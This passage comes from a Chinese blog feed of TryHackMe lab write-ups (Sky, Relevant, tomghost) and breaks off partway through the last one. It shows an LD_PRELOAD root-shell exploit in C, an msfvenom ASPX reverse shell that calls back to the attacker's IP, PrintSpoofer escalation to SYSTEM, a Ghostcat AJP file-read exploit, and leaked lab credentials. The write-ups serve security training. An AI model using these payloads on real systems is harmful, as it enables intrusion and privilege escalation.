class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper@sky:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for webdeveloper on sky:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User webdeveloper may run the following commands on sky:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility</span><br><span class="line">webdeveloper@sky:~$ file /usr/bin/sky_backup_utility</span><br><span class="line">file /usr/bin/sky_backup_utility</span><br><span class="line">/usr/bin/sky_backup_utility: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1edd422e86d9c4cdb136d11a2dfbda966aa326d, for GNU/Linux 3.2.0, not stripped</span><br><span class="line">webdeveloper@sky:~$ strings /usr/bin/sky_backup_utility</span><br><span class="line">strings /usr/bin/sky_backup_utility</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">puts</span><br><span class="line">printf</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">libc.so.6</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Sky Backup Utility</span><br><span class="line">Now attempting to backup Sky</span><br><span class="line">tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*</span><br><span class="line">Backup failed!</span><br><span class="line">Check your permissions!</span><br><span class="line">Backup successful!</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.0</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">sky.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">puts@GLIBC_2.2.5</span><br><span class="line">_edata</span><br><span class="line">system@GLIBC_2.2.5</span><br><span class="line">printf@GLIBC_2.2.5</span><br><span class="line">__libc_start_main@GLIBC_2.2.5</span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">__cxa_finalize@GLIBC_2.2.5</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>tar``/var/www/html/``/root/.backup/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exploit -fPIC -shared -nostartfiles -w</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/tmp/exploit /usr/bin/sky_backup_utility</span><br><span class="line">root@sky:/tmp# whoami;hostname;id;ip a</span><br><span class="line">root</span><br><span class="line">sky</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><ol><li>任意文件上传</li><li>通过 MongoDB 数据库中的明文加密进行权限提升<code>backup</code></li><li>通过滥用环境变量进行权限提升<code>LD_PRELOAD</code></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>relevant-thm</title>
      <link href="/2024/11/16/relevant/"/>
      <url>/2024/11/16/relevant/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：中等<br>描述：<br>前置条件：</p></blockquote><p>您已被分配到一个需要渗透测试的客户 在应在 7 天后发布到生产环境的环境中执行。</p><p><strong>工作范围</strong></p><p>客户端请求 工程师进行评估 提供的虚拟环境。客户要求最低限度 提供有关评估的信息，希望参与 从恶意行为者的眼睛进行（黑匣子渗透 test） 的客户端要求您保护两个标志（无位置 提供）作为利用证明：</p><ul><li>User.txt</li><li>Root.txt</li></ul><p>此外，客户还提供了以下范围限额：</p><ul><li><p>此项目允许使用任何工具或技术，但我们要求您先尝试手动利用  </p></li><li><p>找到并记录发现的所有漏洞</p></li><li><p>将发现的标记提交到仪表板</p></li><li><p>只有分配给计算机的 IP 地址在范围内</p></li><li><p>查找并报告所有漏洞（是的，通往 root 的路径不止一条）</p></li></ul><p>（角色扮演关闭）</p><p>我 鼓励您将此挑战视为实际的渗透测试。 考虑写一份报告，包括执行摘要。 漏洞和利用评估以及补救建议， 因为这将使您为 eLearnSecurity 认证专业渗透测试员或职业生涯做好准备 作为现场的渗透测试人员。</p><p>注意 - 此房间中没有任何内容需要 Metasploit</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.106.190</td></tr><tr><td>OS</td><td>kali</td><td>Windows</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.106.190:445</span><br><span class="line">Open 10.10.106.190:80</span><br><span class="line">Open 10.10.106.190:135</span><br><span class="line">Open 10.10.106.190:139</span><br><span class="line">Open 10.10.106.190:3389</span><br><span class="line">Open 10.10.106.190:49663</span><br><span class="line">Open 10.10.106.190:49668</span><br><span class="line">Open 10.10.106.190:49666</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49663/tcp open  http               syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.106.190 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">❯ smbclient -L //10.10.106.190                                                                                                  </span><br><span class="line">Password for [WORKGROUP\kali]:                                                                                                  </span><br><span class="line">                                                                                                                                </span><br><span class="line">        Sharename       Type      Comment                                                                                       </span><br><span class="line">        ---------       ----      -------                                                                                       </span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        nt4wrksv        Disk      </span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.106.190 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/thm/creative </span><br><span class="line">❯ smbclient //10.10.106.190/nt4wrksv                                                                                            </span><br><span class="line">Password for [WORKGROUP\kali]:                                                                                                  </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Sat Jul 25 17:46:04 2020</span><br><span class="line">  ..                                  D        0  Sat Jul 25 17:46:04 2020</span><br><span class="line">  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020</span><br><span class="line"></span><br><span class="line">                7735807 blocks of size 4096. 4944646 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/thm/creative [127]</span><br><span class="line">❯ echo &quot;Qm9iIC0gIVBAJCRXMHJEITEyMw==&quot; |base64 -d                                                                                </span><br><span class="line">Bob - !P@$$W0rD!123⏎                                                               kali@kali ~/Documents/thm/creative </span><br><span class="line">❯ echo &quot;QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk&quot; |base64 -d                                                                    </span><br><span class="line">Bill - Juw4nnaM4n420696969!$$$⏎                                                     kali@kali ~/Documents/thm/creative </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SSH登录失败<br>寻找别的攻击向量<br>如果能找到文件上传的地方 和文件调用的地方可以获取webshell</p><p>可以访问到smb里面的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/creative]</span><br><span class="line">└─$ curl http://10.10.106.190:49663/nt4wrksv/passwords.txt</span><br><span class="line">[User Passwords - Encoded]</span><br><span class="line">Qm9iIC0gIVBAJCRXMHJEITEyMw==</span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>获取上传aspshell 获取webshell</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a href="/../assets/img/Pasted%20image%2020241116174645.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116174645.png"></a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="/../assets/img/Pasted%20image%2020241116174724.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116174724.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/relevant]</span><br><span class="line">└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.5.121 LPORT=1234 -f aspx -o shell.aspx </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of aspx file: 3422 bytes</span><br><span class="line">Saved as: shell.aspx</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/relevant]</span><br><span class="line">└─$ curl http://10.10.106.190:49663/nt4wrksv/shell.aspx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241116175603.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116175603.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br></pre></td></tr></table></figure><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Bob\Desktop&gt; cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">THM&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Bob\Desktop&gt; whoami /priv</span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class="line">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br><span class="line">PS C:</span><br></pre></td></tr></table></figure><p>由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序–下载PrintSpoofer.exe，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /s /b c:\ | find &quot;PrintSpoofer64.exe&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\nt4wrksv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\nt4wrksv&gt;PrintSpoofer64.exe -i -c cmd</span><br><span class="line">PrintSpoofer64.exe -i -c cmd</span><br><span class="line">[+] Found privilege: SeImpersonatePrivilege</span><br><span class="line">[+] Named pipe listening...</span><br><span class="line">[+] CreateProcessAsUser() OK</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;type root.txt</span><br><span class="line">type root.txt</span><br><span class="line">THM&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SMB文件上传到webshell获取<br>通过在 Windows 10 和 Server 2016&#x2F;2019 上滥用从 LOCAL&#x2F;NETWORK SERVICE 到 SYSTEM。<code>SeImpersonatePrivilege</code></p><p>应该还有其他思路 有两个base64文件没有利用</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomghost</title>
      <link href="/2024/11/16/tomghost/"/>
      <url>/2024/11/16/tomghost/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.211.222</td></tr><tr><td>OS</td><td>Kali</td><td>Linux ubuntu</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT     STATE SERVICE    REASON</span><br><span class="line">22/tcp   open  ssh        syn-ack ttl 60</span><br><span class="line">53/tcp   open  domain     syn-ack ttl 60</span><br><span class="line">8009/tcp open  ajp13      syn-ack ttl 60</span><br><span class="line">8080/tcp open  http-proxy syn-ack ttl 60</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.71 seconds</span><br><span class="line">           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进一步进行版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT     STATE SERVICE    REASON         VERSION</span><br><span class="line">22/tcp   open  ssh        syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp   open  tcpwrapped syn-ack ttl 60</span><br><span class="line">8009/tcp open  ajp13      syn-ack ttl 60 Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp open  http       syn-ack ttl 60 Apache Tomcat 9.0.30</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache jserv protocol v1.3 exploit</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241116163206.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116163206.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/leonooo13/CNVD-2020-10487-Tomcat-Ajp-lfi.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py -h           </span><br><span class="line">usage: CNVD-2020-10487-Tomcat-Ajp-lfi.py [-h] [-p PORT] [-f FILE] target</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                Hostname or IP to attack</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PORT, --port PORT  AJP port to attack (default is 8009)</span><br><span class="line">  -f FILE, --file FILE  file path :(WEB-INF/web.xml)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi.py 10.10.211.222                       </span><br><span class="line">-----------------------------------</span><br><span class="line">目标: 10.10.211.222 端口: 8009 文件:WEB-INF/web.xml</span><br><span class="line">-----------------------------------</span><br><span class="line">Getting resource at ajp13://10.10.211.222:8009/asdf</span><br><span class="line">----------------------------</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work <span class="keyword">for</span> additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the <span class="string">&quot;License&quot;</span>); you may not use this file except <span class="keyword">in</span> compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to <span class="keyword">in</span> writing, software</span><br><span class="line">  distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License <span class="keyword">for</span> the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">  xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><br><span class="line"><span class="string">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">  version=<span class="string">&quot;4.0&quot;</span></span><br><span class="line">  metadata-complete=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span><br><span class="line">  &lt;description&gt;</span><br><span class="line">     Welcome to GhostCat</span><br><span class="line">        skyfuck:8730281lkjlkjdqlksalks</span><br><span class="line">  &lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><p>ssh登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skyfuck:8730281lkjlkjdqlksalks </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 